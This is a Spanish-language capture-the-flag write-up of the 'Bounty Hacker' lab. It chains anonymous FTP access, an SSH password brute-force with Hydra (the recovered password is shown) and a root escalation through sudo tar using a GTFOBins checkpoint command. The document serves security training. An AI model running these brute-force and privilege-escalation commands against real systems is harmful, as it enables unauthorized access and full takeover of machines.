# Bounty Hacker

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux aprovechando el acceso anónimo al servicio **FTP**, obtener credenciales válidas para acceder mediante **SSH** y escalar privilegios explotando una mala configuración de **sudo** sobre el binario `tar`.

---

## 🛠️ Tecnologías trabajadas

- FTP
- SSH
- Hydra
- Sudo
- GTFOBins
- Tar

---

## 🧠 Metodología

La enumeración inicial reveló tres servicios expuestos: **FTP**, **SSH** y **HTTP**. El escaneo detallado mostró que el servidor FTP permitía el acceso anónimo, convirtiéndose inmediatamente en el vector de ataque más interesante.

En lugar de centrarme en la página web, decidí explorar el contenido disponible en el FTP. Allí encontré varios archivos que proporcionaban información útil sobre posibles usuarios y contraseñas, permitiendo construir un ataque de fuerza bruta mucho más dirigido contra el servicio SSH.

Una vez obtenido el acceso al sistema, la enumeración de privilegios mediante `sudo -l` mostró que el usuario podía ejecutar el binario `tar` como **root** sin necesidad de contraseña. En lugar de buscar vulnerabilidades adicionales, consulté **GTFOBins** para identificar una técnica conocida que permitiera ejecutar comandos arbitrarios con privilegios elevados.

Este laboratorio demuestra cómo una mala configuración de servicios y permisos puede facilitar una cadena completa de explotación sin necesidad de recurrir a vulnerabilidades complejas.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé realizando un escaneo completo mediante Nmap.

```bash
nmap -p- 10.130.164.178
```

Los servicios detectados fueron:

| Puerto | Servicio |
|---------|----------|
| 21 | FTP |
| 22 | SSH |
| 80 | HTTP |

Posteriormente ejecuté una enumeración más detallada.

```bash
nmap -sV -sC -p21,22,80 10.130.164.178
```

La información confirmó que:

- El servidor FTP permitía **Anonymous Login**.
- SSH estaba disponible para autenticación.
- La aplicación web no aportaba información relevante para la explotación.

---

### 2. Enumeración del servicio FTP

Accedí al servidor utilizando el acceso anónimo.

```bash
ftp anonymous@10.130.164.178
```

Dentro del servidor encontré dos archivos:

- `task.txt`
- `locks.txt`

Al revisar el primero obtuve un nombre de usuario válido:

```
lin
```

El segundo archivo contenía una lista de posibles contraseñas que podía utilizarse como diccionario para un ataque de fuerza bruta.

---

### 3. Obtención del acceso inicial

Con la información obtenida lancé un ataque de fuerza bruta contra el servicio SSH utilizando Hydra.

```bash
hydra -l lin -P locks.txt ssh://10.130.164.178
```

El ataque devolvió las siguientes credenciales:

```
Usuario: lin

Contraseña: RedDr4gonSynd1cat3
```

Con ellas inicié sesión mediante SSH.

```bash
ssh lin@10.130.164.178
```

Una vez autenticado recuperé la primera flag:

```
user.txt
```

---

### 4. Enumeración interna

El siguiente paso consistió en revisar los privilegios disponibles mediante `sudo`.

```bash
sudo -l
```

El resultado mostró que el usuario podía ejecutar el siguiente binario como **root**:

```text
/bin/tar
```

Esta configuración era suficiente para realizar una escalada de privilegios utilizando una técnica documentada en GTFOBins.

---

### 5. Escalada de privilegios

Consulté **GTFOBins** para comprobar las posibilidades de explotación del binario `tar`.

La técnica consistía en ejecutar un comando arbitrario aprovechando la funcionalidad de checkpoints.

Ejecuté:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

Tras ejecutar el comando obtuve una shell con privilegios elevados.

Comprobé el usuario actual:

```bash
whoami
```

Resultado:

```
root
```

Finalmente recuperé la última flag ubicada en:

```
/root/root.txt
```

---

## 📚 Lecciones aprendidas

- Este laboratorio permitió practicar una cadena de explotación sencilla basada en configuraciones inseguras de servicios y permisos.
- Aprovechar el acceso anónimo a un servidor FTP para obtener información sensible.
- Extraer usuarios y diccionarios de contraseñas a partir de archivos expuestos.
- Realizar ataques de fuerza bruta dirigidos contra SSH utilizando Hydra.
- Enumerar correctamente los privilegios disponibles mediante `sudo -l`.
- Utilizar **GTFOBins** para explotar el binario `tar`.
- Comprender cómo determinadas utilidades del sistema pueden convertirse en vectores de escalada cuando se ejecutan mediante **sudo**.
